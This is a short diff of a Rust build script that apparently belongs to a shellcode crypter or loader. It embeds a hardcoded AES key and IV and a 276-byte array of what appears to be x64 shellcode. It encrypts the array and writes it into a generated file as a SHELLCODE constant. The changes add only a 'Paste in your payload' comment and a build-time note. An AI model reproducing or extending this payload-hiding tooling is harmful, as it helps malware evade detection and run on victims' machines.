@@ -8,7 +8,7 @@ use libaes::Cipher;
 const _KEY: &[u8; 32] = b"Godspeed You! Black Emperor00000";
 const _IV: &[u8; 16] = b"examplexample...";
 
-
+// Paste in your payload
 const DATA: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
     0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
     0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
@@ -69,7 +69,7 @@ fn main () {
     let encrypted_payload_str = to_output_string(&encrypted_payload);
 
     let file_content = format!(
-        "
+        "// This file is created automatically during build time.
 pub const INITVEC: [u8; 16] = {};
 pub const KEY: [u8; 32] = {};
 pub const SHELLCODE: &[u8] = &{};
